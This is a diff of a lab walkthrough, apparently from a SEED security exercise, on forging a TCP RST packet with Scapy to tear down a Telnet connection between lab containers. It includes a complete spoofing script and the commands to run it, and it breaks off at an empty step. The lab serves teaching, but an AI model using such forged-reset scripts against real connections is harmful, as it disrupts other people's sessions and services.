@@ -1,6 +1,6 @@
 # TCP RST Attacks on telnet Connections
 
-The objective of this exercise is to create one forged TCP RST (Reset) packet that looks like it came from the legitimate Telnet client. The goal is to make the existing Telnet connection close.
+The TCP RST Attack can terminate an established TCP connection between two victims: User 1 (IP 10.9.0.6) and Victim Machine (IP 10.9.0.5). The objective of this exercise is to create one forged TCP RST (Reset) packet that looks like it came from the legitimate Telnet client - User 1 (IP 10.9.0.6). The goal is to make the existing Telnet connection close/break.
 
 ## Assumptions
 - In this lab, we have three machines
@@ -8,6 +8,7 @@ The objective of this exercise is to create one forged TCP RST (Reset) packet th
       - 1 victim machine: IP Address - 10.9.0.5
       - 1 user machine: IP address - 10.9.0.6
 - We use containers to set up the lab environment
+- The attacker can observe the TCP traffic between A and B.
 - All these machines are on the same LAN
 
 ### Try to connect as User1
@@ -63,4 +64,71 @@ The objective of this exercise is to create one forged TCP RST (Reset) packet th
   ip.src == 10.9.0.6 && ip.dst == 10.9.0.5 && tcp.port == 23
   ```
 
-10) d
+
+10) Next, select any from the established Telnet connection going from User 1 (10.9.0.6) to the Victim (10.9.0.5).
+
+<img width="1230" height="805" alt="image" src="https://github.com/user-attachments/assets/0cb752c4-bd8d-41fb-8ac4-123dceafd554" />
+
+### Create your RST packet
+
+11) Return to you VM terminal and create a file with:
+
+  ```javascript
+  nano tcprst.py
+  ```
+
+
+<img width="792" height="124" alt="image" src="https://github.com/user-attachments/assets/ab868238-d703-4fb1-90c8-55597490f69b" />
+
+12)  Paste the following:
+ 
+  ```javascript
+  #!/usr/bin/env python3
+from scapy.all import *
+
+# Task 2: TCP RST Attack
+# Values copied from Wireshark Frame 11
+
+ip = IP(src="10.9.0.6", dst="10.9.0.5") # src="10.9.0.6" - we pretend to be User 1 | dst = "10.9.0.5" - we're sending the forged packet to the Victim/Telnet server
+
+tcp = TCP(
+    sport=53446, #  User 1's temporary TCP port for this Telnet connection.
+    dport=23, # Victim/Telnet server uses TCP port 23
+    flags="R", # R means TCP Reset.
+    seq=3608199035, # These are the TCP sequence/acknowledgment values you copied from Wireshark.
+)
+
+pkt = ip/tcp
+
+ls(pkt)
+send(pkt, verbose=0)
+  ```
+
+13) Save it with 
+
+  ```javascript
+  Ctrl + O
+File Name to Write: /home/seed/tcprst.py
+Enter
+Ctrl + X
+  ```
+
+
+14) Back in the VM terminal, run:
+
+  ```javascript
+  ls -l /home/seed/tcprst.py
+  ```
+
+<img width="631" height="83" alt="image" src="https://github.com/user-attachments/assets/072213a4-c269-4357-a36d-01ef4152a28d" />
+
+
+15) Because Scapy needs permission to send a crafted packet, run:
+
+  ```javascript
+  sudo python3 /home/seed/tcprst.py
+  ```
+
+<img width="788" height="579" alt="image" src="https://github.com/user-attachments/assets/1d901c70-ecf3-4194-a674-a1a7a51a25cb" />
+
+16) 
